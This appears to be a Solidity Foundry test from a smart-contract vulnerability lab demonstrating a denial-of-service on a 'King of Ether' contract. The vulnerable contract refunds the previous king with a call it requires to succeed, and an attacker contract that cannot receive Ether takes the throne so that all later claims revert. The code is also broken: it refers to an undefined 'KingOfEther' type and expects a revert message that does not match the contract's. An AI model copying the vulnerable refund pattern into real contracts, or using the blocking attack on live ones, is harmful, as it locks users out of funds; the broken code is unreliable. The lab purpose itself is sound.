pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract ContractTest is Test {
    etherKing etherKingContract;
    Attack attackContract;

    function setUp() public {
        etherKingContract = new KingOfEther();
        attackContract = new Attack(etherKingContract);
    }

    function testDOS() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);
        vm.deal(address(alice), 4 ether);
        vm.deal(address(bob), 2 ether);
        vm.prank(alice);
        etherKingContract.claimThrone{value: 1 ether}();
        vm.prank(bob);
        etherKingContract.claimThrone{value: 2 ether}();
        console.log( "Return 1 ETH to Alice, Alice of balance", address(alice).balance);
        attackContract.attack{value: 3 ether}();

        console.log("Balance of etherKingContract",etherKingContract.balance());
        console.log("Attack completed");
        vm.prank(alice);
        vm.expectRevert("Failed");
        etherKingContract.claimThrone{value: 4 ether}();
    }

    receive() external payable {}
}

contract etherKing {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");
        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    etherKing etherKing;

    constructor(etherKing _etherKing) {
        etherKing = KingOfEther(_etherKing);
    }

    function attack() public payable {
        etherKing.claimThrone{value: msg.value}();
    }
}